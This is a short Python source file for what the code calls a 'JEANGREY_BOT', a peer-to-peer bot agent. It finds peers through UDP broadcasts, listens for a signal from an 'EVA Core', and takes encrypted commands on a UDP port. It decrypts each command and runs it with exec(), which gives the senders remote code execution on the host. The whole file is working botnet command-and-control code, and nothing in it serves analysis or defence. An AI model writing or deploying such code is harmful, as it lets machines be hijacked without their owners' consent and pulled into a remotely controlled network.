import socket
import threading
import time
from jeangrey_crypto import decrypt, encrypt

BROADCAST_PORT = 4444
COMMAND_PORT = 5556
peers = set()

def mesh_broadcast():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
    while True:
        sock.sendto(b"JEANGREY_BOT_DISCOVER", ("255.255.255.255", BROADCAST_PORT))
        time.sleep(10)

def mesh_listen():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", BROADCAST_PORT))
    while True:
        data, addr = sock.recvfrom(1024)
        if data == b"JEANGREY_BOT_DISCOVER":
            ip = addr[0]
            if ip not in peers:
                peers.add(ip)
                print(f"[+] Peer: {ip}")

def command_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", COMMAND_PORT))
    while True:
        data, addr = sock.recvfrom(2048)
        try:
            decrypted = decrypt(data.decode())
            print(f"[CMD] From {addr[0]}: {decrypted}")
            exec(decrypted)
        except Exception as e:
            print(f"[!] Failed command: {e}")

def core_presence_listener():
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.bind(("", 4445))
    while True:
        data, addr = sock.recvfrom(1024)
        try:
            msg = decrypt(data.decode())
            if msg == "EVA_CORE_ACTIVE":
                print(f"[♥] EVA Core Detected: {addr[0]}")
        except:
            pass

def main():
    threading.Thread(target=mesh_listen, daemon=True).start()
    threading.Thread(target=command_listener, daemon=True).start()
    threading.Thread(target=core_presence_listener, daemon=True).start()
    mesh_broadcast()

if __name__ == "__main__":
    main()
